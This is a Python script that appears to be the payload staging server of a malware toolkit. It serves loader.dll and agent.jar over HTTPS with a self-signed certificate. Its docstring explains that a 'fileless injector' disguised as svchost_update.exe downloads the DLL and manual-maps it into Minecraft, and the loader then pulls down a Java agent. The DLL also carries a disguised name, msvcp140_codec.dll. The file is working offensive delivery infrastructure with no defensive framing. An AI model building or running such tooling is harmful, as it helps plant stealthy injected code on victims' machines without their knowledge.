#!/usr/bin/env python3
"""
Serves both loader.dll and agent.jar over HTTPS.

The fileless injector (svchost_update.exe) downloads loader.dll from here,
manual-maps it into Minecraft. The loader inside Minecraft then downloads
agent.jar from here. Two requests total, then the server can be stopped.

Usage:
    python serve.py                        # serves on 0.0.0.0:8443
    python serve.py --port 9000            # custom port
    python serve.py --cert cert.pem --key key.pem
"""

import argparse
import http.server
import os
import ssl
import subprocess
import sys


def generate_self_signed(cert_path, key_path):
    subprocess.run([
        "openssl", "req", "-x509", "-newkey", "rsa:2048",
        "-keyout", key_path, "-out", cert_path,
        "-days", "365", "-nodes",
        "-subj", "/CN=localhost"
    ], check=True, capture_output=True)


def setup_serve_dir(jar_path, dll_path):
    serve_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "files")
    os.makedirs(serve_dir, exist_ok=True)

    for src, name in [(jar_path, "agent.jar"), (dll_path, "loader.dll")]:
        if src and os.path.exists(src):
            dst = os.path.join(serve_dir, name)
            if not os.path.exists(dst):
                os.symlink(os.path.abspath(src), dst)
            print(f"[+] {name} -> {src}")
        elif src:
            print(f"[!] not found: {src}")

    return serve_dir


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--port", type=int, default=8443)
    parser.add_argument("--cert", default="cert.pem")
    parser.add_argument("--key", default="key.pem")
    parser.add_argument("--jar", default="../agent/build/libs/agent-1.0.0.jar")
    parser.add_argument("--dll", default="../loader/build/Release/msvcp140_codec.dll")
    args = parser.parse_args()

    serve_dir = setup_serve_dir(args.jar, args.dll)

    if not os.path.exists(args.cert) or not os.path.exists(args.key):
        print("[*] generating self-signed TLS certificate...")
        generate_self_signed(args.cert, args.key)

    os.chdir(serve_dir)

    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(
        os.path.abspath(args.cert),
        os.path.abspath(args.key)
    )

    server = http.server.HTTPServer(("0.0.0.0", args.port), http.server.SimpleHTTPRequestHandler)
    server.socket = ctx.wrap_socket(server.socket, server_side=True)

    print(f"\n[+] https://0.0.0.0:{args.port}/loader.dll")
    print(f"[+] https://0.0.0.0:{args.port}/agent.jar")
    print("[+] ctrl+c to stop after injection\n")

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[+] stopped")


if __name__ == "__main__":
    main()
